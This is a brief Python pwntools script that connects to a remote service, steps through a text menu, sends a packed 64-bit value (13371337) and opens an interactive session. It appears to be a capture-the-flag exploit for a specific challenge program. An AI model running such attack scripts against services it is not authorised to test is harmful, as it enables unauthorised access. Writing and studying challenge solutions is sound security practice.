#!/usr/bin/env python3

import sys
from pwn import *

ip = sys.argv[1]
port = int(sys.argv[2])
r = remote(ip, port)

r.readuntil(b'>> ')
r.sendline('T')
r.readuntil(b'>> ')
r.sendline(b'S')
r.readuntil(b'>> ')
r.sendline(p64(13371337))
r.readuntil(b'>> ')
r.sendline(b'C')
r.interactive()